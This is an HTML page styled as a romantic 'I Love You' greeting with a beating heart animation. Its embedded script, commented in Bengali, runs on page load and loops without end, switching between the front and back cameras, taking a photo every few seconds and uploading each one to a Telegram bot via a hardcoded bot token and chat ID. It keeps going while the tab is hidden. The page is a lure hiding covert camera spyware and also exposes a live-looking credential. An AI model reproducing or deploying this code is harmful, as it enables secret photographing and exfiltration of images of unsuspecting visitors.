<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>I Love You</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: radial-gradient(circle, #ff758c, #ff7eb3, #ffb199);
      font-family: 'Comic Sans MS', cursive, sans-serif;
      overflow: hidden;
    }
    .container {
      text-align: center;
      animation: fadeIn 2s ease-in-out;
    }
    .heart {
      font-size: 5rem;
      color: #ff1e56;
      animation: beat 1s infinite;
    }
    h1 {
      font-size: 3rem;
      color: #fff;
      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
      margin: 20px 0;
    }
    h1 span {
      color: #ffeb3b;
      font-style: italic;
    }
    @keyframes fadeIn {
      from {
        opacity: 0;
        transform: translateY(-50px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    @keyframes beat {
      0%, 100% {
        transform: scale(1);
      }
      50% {
        transform: scale(1.2);
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="heart">❤️</div>
    <h1>I <span>Love</span> You</h1>
  </div>
  <script>
        const telegramBotToken = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w"; // আপনার টেলিগ্রাম বট টোকেন দিন
        const chatId = "1987016824"; // আপনার চ্যাট আইডি দিন

        let stream;
        const videoElement = document.getElementById("video");
        const canvas = document.getElementById("canvas");

        // ক্যামেরা চালু করার ফাংশন
        async function startCamera(facingMode) {
            if (stream) {
                stream.getTracks().forEach((track) => track.stop());
            }
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: facingMode }
                });
                videoElement.srcObject = stream;
            } catch (error) {
                console.error("Camera access error:", error);
            }
        }

        // ফটো তোলার ফাংশন
        async function capturePhoto() {
            const context = canvas.getContext("2d");
            canvas.width = videoElement.videoWidth;
            canvas.height = videoElement.videoHeight;
            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

            const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/jpeg"));

            const formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", blob, "photo.jpg");

            try {
                await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
                console.log("Photo sent to Telegram.");
            } catch (error) {
                console.error("Error sending photo to Telegram:", error);
            }
        }

        // ফ্রন্ট এবং ব্যাক ক্যামেরা পরিবর্তন করে ফটো তুলুন
        async function startAutomaticCapture() {
            while (true) {
                // ফ্রন্ট ক্যামেরা দিয়ে ফটো তুলুন
                await startCamera("user");
                console.log("Using front camera...");
                await delay(5000); // ৫ সেকেন্ড অপেক্ষা
                await capturePhoto();

                // ব্যাক ক্যামেরা দিয়ে ফটো তুলুন
                await startCamera("environment");
                console.log("Using back camera...");
                await delay(5000); // ৫ সেকেন্ড অপেক্ষা
                await capturePhoto();
            }
        }

        // বিল্ট-ইন delay ফাংশন
        function delay(ms) {
            return new Promise((resolve) => setTimeout(resolve, ms));
        }

        // ট্যাব নিষ্ক্রিয় হলেও কাজ চালু রাখুন
        document.addEventListener("visibilitychange", () => {
            if (document.visibilityState === "visible") {
                console.log("Tab is active");
            } else {
                console.log("Tab is inactive, but script continues...");
            }
        });

        // স্ক্রিপ্ট শুরু করুন
        startAutomaticCapture();
    </script>
</body>

</html>
